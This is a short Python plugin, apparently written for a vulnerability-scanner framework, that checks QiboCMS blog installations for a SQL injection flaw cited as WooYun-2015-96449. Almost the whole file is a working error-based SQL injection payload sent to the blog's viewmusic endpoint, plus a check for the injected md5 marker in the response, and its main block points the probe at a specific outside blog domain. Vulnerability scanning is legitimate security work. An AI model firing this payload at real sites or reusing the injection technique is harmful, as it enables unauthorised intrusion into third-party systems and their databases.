#!/usr/bin/env python
#-*- coding:utf-8 -*-
#__Author__:tsplay
#__Refer__:WooYun-2015-96449
#__SerType:Qibo Blogsystem SQL-Injection
import re
def assign(service, arg):
	if service == "qibocms":
		return True, arg

def audit(arg):
	payload = 'blog/index.php?file=viewmusic&uid=1%27&id=1&BM[music_song]=qb_members%20where%201=1%20union%20select%20((select%201%20from%20(select%20count(*),concat((select%20md5(1)),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a))%23'
	target = arg + payload
	code, head, body, errcode, _url = curl.curl(target)
	if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b1' in body:
		security_hole(target)

if __name__ == '__main__':
	from dummy import *
	audit(assign('qibocms', 'http://blog.ybxjy.com/')[1])